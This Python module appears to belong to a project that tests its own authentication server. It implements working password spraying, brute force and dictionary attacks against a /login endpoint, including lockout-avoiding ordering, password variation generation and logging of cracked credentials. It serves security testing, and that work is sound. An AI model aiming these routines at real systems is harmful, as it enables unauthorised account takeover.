"""
attacks.py
Attack simulation methods for testing authentication server security.
"""

import json
import os
import sys
import time
from datetime import datetime, timezone
from typing import List, Dict

import requests

import attacks_const as const

# Add parent directory to path for server imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from server.utils.config import load_config
from server.utils import utils_const


def log_attack_attempt(log_filepath: str, attack_type: str, username: str, password: str, 
                       success: bool, attempt_number: int, response_time_ms: float):
    """
    Log a single attack attempt to a JSON log file.
    
    :param log_filepath: Path to the log file
    :param attack_type: Type of attack (e.g., "password_spraying", "brute_force")
    :param username: Username attempted
    :param password: Password attempted
    :param success: Whether the attempt was successful
    :param attempt_number: Sequential attempt number in this attack
    :param response_time_ms: Server response time in milliseconds
    """
    timestamp = datetime.now(timezone.utc).isoformat(timespec="milliseconds")
    
    log_entry = {
        "timestamp": timestamp,
        "attack_type": attack_type,
        "attempt_number": attempt_number,
        "username": username,
        "password": password,
        "success": success,
        "response_time_ms": round(response_time_ms, 2)
    }
    
    # Append as single JSON line
    with open(log_filepath, "a") as f:
        f.write(json.dumps(log_entry) + "\n")


def get_attack_log_filename(attack_type: str, target: str = None) -> str:
    """
    Generate log filename for attack simulation.
    
    :param attack_type: Type of attack
    :param target: Optional target username for brute force attacks
    :return: Full path to log file
    """
    log_dir = os.path.join(os.path.dirname(__file__), '..', 'logs', const.LOG_DIR_ATTACKS)
    os.makedirs(log_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    if target:
        filename = f"{attack_type}_{target}_{timestamp}.log"
    else:
        filename = f"{attack_type}_{timestamp}.log"
    
    return os.path.join(log_dir, filename)


def load_server_config(config_path: str = None) -> Dict:
    """
    Load server configuration to get target URL and other settings.
    
    :param config_path: Optional path to config file
    :return: Configuration dictionary
    """
    if config_path is None:
        # Default config path
        config_path = os.path.join(
            os.path.dirname(__file__), '..', 'server', 'config', 'server_config.json'
        )
    
    config = load_config(config_path)
    return config


def get_server_url_from_config(config: Dict) -> str:
    """
    Build server URL from configuration.
    
    :param config: Configuration dictionary
    :return: Full server URL (e.g., "http://localhost:8000")
    """
    host = config[utils_const.SCHEME_KEY_HOST]
    port = config[utils_const.SCHEME_KEY_PORT]
    
    # Convert 0.0.0.0 to localhost for client connections
    if host == const.DEFAULT_SERVER_BIND_ADDRESS:
        host = const.DEFAULT_LOCALHOST
    
    return f"http://{host}:{port}"


def password_spraying(
    server_url: str,
    usernames: List[str],
    passwords: List[str] = None,
    delay: float = const.DEFAULT_DELAY,
    enable_logging: bool = True
) -> Dict[str, any]:
    """
    Simulate a password spraying attack.
    
    Tries common passwords against multiple user accounts. This attack avoids
    account lockout by trying one password against many users before moving
    to the next password.
    
    :param server_url: Base URL of the authentication server (e.g., "http://localhost:8000")
    :param usernames: List of usernames to target
    :param passwords: List of passwords to try (defaults to COMMON_PASSWORDS)
    :param delay: Delay in seconds between attempts to avoid rate limiting
    :param enable_logging: Whether to log all attempts to file
    :return: Dictionary with attack results including successful credentials
    """
    if passwords is None:
        passwords = const.COMMON_PASSWORDS
    
    results = {
        "attack_type": const.ATTACK_TYPE_PASSWORD_SPRAYING,
        "total_attempts": 0,
        "successful_logins": [],
        "failed_attempts": 0,
        "start_time": time.time(),
        "end_time": None,
    }
    
    # Initialize logging if enabled
    log_filepath = None
    if enable_logging:
        log_filepath = get_attack_log_filename(const.ATTACK_TYPE_PASSWORD_SPRAYING)
        results["log_file"] = log_filepath
        print(f"[*] Logging to: {log_filepath}")
    
    login_url = f"{server_url}/login"
    
    print(f"[*] Starting password spraying attack")
    print(f"[*] Target: {server_url}")
    print(f"[*] Testing {len(passwords)} passwords against {len(usernames)} users")
    print(f"[*] Total attempts: {len(passwords) * len(usernames)}")
    
    # Try each password against all users
    for password in passwords:
        print(f"\n[*] Trying password: '{password}'")
        
        for username in usernames:
            results["total_attempts"] += 1
            attempt_start = time.time()
            success = False
            
            try:
                response = requests.post(
                    login_url,
                    json={"username": username, "password": password},
                    timeout=const.DEFAULT_TIMEOUT
                )
                
                response_time_ms = (time.time() - attempt_start) * 1000
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("status") == "success":
                        success = True
                        print(f"[+] SUCCESS! Username: '{username}' Password: '{password}'")
                        results["successful_logins"].append({
                            "username": username,
                            "password": password,
                            "attempt_number": results["total_attempts"]
                        })
                    else:
                        results["failed_attempts"] += 1
                else:
                    results["failed_attempts"] += 1
                
                # Log the attempt
                if enable_logging and log_filepath:
                    log_attack_attempt(
                        log_filepath, const.ATTACK_TYPE_PASSWORD_SPRAYING, username, password,
                        success, results["total_attempts"], response_time_ms
                    )
                    
            except requests.exceptions.RequestException as e:
                print(f"[!] Error connecting to server: {e}")
                results["failed_attempts"] += 1
                response_time_ms = (time.time() - attempt_start) * 1000
                
                # Log failed connection attempt
                if enable_logging and log_filepath:
                    log_attack_attempt(
                        log_filepath, const.ATTACK_TYPE_PASSWORD_SPRAYING, username, password,
                        False, results["total_attempts"], response_time_ms
                    )
            
            # Delay between attempts
            time.sleep(delay)
    
    results["end_time"] = time.time()
    results["duration_seconds"] = results["end_time"] - results["start_time"]
    
    print(f"\n[*] Attack completed in {results['duration_seconds']:.2f} seconds")
    print(f"[*] Successful logins: {len(results['successful_logins'])}")
    print(f"[*] Failed attempts: {results['failed_attempts']}")
    
    return results


def brute_force_attack(
    server_url: str,
    target_username: str,
    password_list: List[str] = None,
    max_attempts: int = None,
    delay: float = const.DEFAULT_DELAY,
    enable_logging: bool = True
) -> Dict[str, any]:
    """
    Simulate a brute force attack against a specific user.
    
    Tries many passwords against a single user account. This is more aggressive
    but more likely to trigger rate limiting mechanisms.
    
    :param server_url: Base URL of the authentication server (e.g., "http://localhost:8000")
    :param target_username: Username to target
    :param password_list: List of passwords to try (defaults to COMMON_PASSWORDS + generated variations)
    :param max_attempts: Maximum number of attempts before stopping (None for unlimited)
    :param delay: Delay in seconds between attempts
    :param enable_logging: Whether to log all attempts to file
    :return: Dictionary with attack results including successful password if found
    """
    if password_list is None:
        # Use common passwords plus some variations
        password_list = const.COMMON_PASSWORDS + _generate_password_variations()
    
    if max_attempts:
        password_list = password_list[:max_attempts]
    
    results = {
        "attack_type": const.ATTACK_TYPE_BRUTE_FORCE,
        "target_username": target_username,
        "total_attempts": 0,
        "successful_password": None,
        "failed_attempts": 0,
        "start_time": time.time(),
        "end_time": None,
    }
    
    # Initialize logging if enabled
    log_filepath = None
    if enable_logging:
        log_filepath = get_attack_log_filename(const.ATTACK_TYPE_BRUTE_FORCE, target_username)
        results["log_file"] = log_filepath
        print(f"[*] Logging to: {log_filepath}")
    
    login_url = f"{server_url}/login"
    
    print(f"[*] Starting brute force attack")
    print(f"[*] Target: {server_url}")
    print(f"[*] Target username: '{target_username}'")
    print(f"[*] Password list size: {len(password_list)}")
    
    for i, password in enumerate(password_list, 1):
        results["total_attempts"] += 1
        attempt_start = time.time()
        success = False
        
        if i % 10 == 0:
            print(f"[*] Progress: {i}/{len(password_list)} attempts...")
        
        try:
            response = requests.post(
                login_url,
                json={"username": target_username, "password": password},
                timeout=const.DEFAULT_TIMEOUT
            )
            
            response_time_ms = (time.time() - attempt_start) * 1000
            
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    success = True
                    print(f"\n[+] SUCCESS! Password found: '{password}'")
                    print(f"[+] Cracked after {results['total_attempts']} attempts")
                    results["successful_password"] = password
                    
                    # Log the successful attempt
                    if enable_logging and log_filepath:
                        log_attack_attempt(
                            log_filepath, const.ATTACK_TYPE_BRUTE_FORCE, target_username, password,
                            True, results["total_attempts"], response_time_ms
                        )
                    
                    results["end_time"] = time.time()
                    results["duration_seconds"] = results["end_time"] - results["start_time"]
                    return results
                else:
                    results["failed_attempts"] += 1
            else:
                results["failed_attempts"] += 1
            
            # Log the attempt
            if enable_logging and log_filepath:
                log_attack_attempt(
                    log_filepath, const.ATTACK_TYPE_BRUTE_FORCE, target_username, password,
                    success, results["total_attempts"], response_time_ms
                )
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error connecting to server: {e}")
            results["failed_attempts"] += 1
            response_time_ms = (time.time() - attempt_start) * 1000
            
            # Log failed connection attempt
            if enable_logging and log_filepath:
                log_attack_attempt(
                    log_filepath, const.ATTACK_TYPE_BRUTE_FORCE, target_username, password,
                    False, results["total_attempts"], response_time_ms
                )
        
        # Delay between attempts
        time.sleep(delay)
    
    results["end_time"] = time.time()
    results["duration_seconds"] = results["end_time"] - results["start_time"]
    
    print(f"\n[*] Attack completed in {results['duration_seconds']:.2f} seconds")
    print(f"[*] Password NOT found after {results['total_attempts']} attempts")
    
    return results


def _generate_password_variations() -> List[str]:
    """
    Generate additional password variations for brute force attacks.
    
    :return: List of password variations
    """
    variations = []
    
    # Common number patterns
    for i in range(const.PASSWORD_GEN_NUMBER_START, const.PASSWORD_GEN_NUMBER_END, 
                   const.PASSWORD_GEN_NUMBER_STEP):
        variations.append(str(i))
    
    # Year-based passwords
    for year in range(const.PASSWORD_GEN_YEAR_START, const.PASSWORD_GEN_YEAR_END):
        variations.append(str(year))
    
    # Common words with numbers
    for word in const.PASSWORD_GEN_COMMON_WORDS:
        for num in range(const.PASSWORD_GEN_NUMBER_RANGE):
            variations.append(f"{word}{num}")
            variations.append(f"{word}{num}{num}")
            variations.append(f"{num}{word}")
    
    return variations


def dictionary_attack(
    server_url: str,
    target_username: str,
    dictionary_file: str,
    delay: float = const.DEFAULT_DELAY,
    enable_logging: bool = True
) -> Dict[str, any]:
    """
    Simulate a dictionary attack using passwords from a file.
    
    :param server_url: Base URL of the authentication server
    :param target_username: Username to target
    :param dictionary_file: Path to file containing passwords (one per line)
    :param delay: Delay in seconds between attempts
    :param enable_logging: Whether to log all attempts to file
    :return: Dictionary with attack results
    """
    try:
        with open(dictionary_file, 'r', encoding='utf-8') as f:
            password_list = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Dictionary file not found: {dictionary_file}")
        return {"error": "Dictionary file not found"}
    
    print(f"[*] Loaded {len(password_list)} passwords from dictionary")
    return brute_force_attack(server_url, target_username, password_list, 
                             delay=delay, enable_logging=enable_logging)
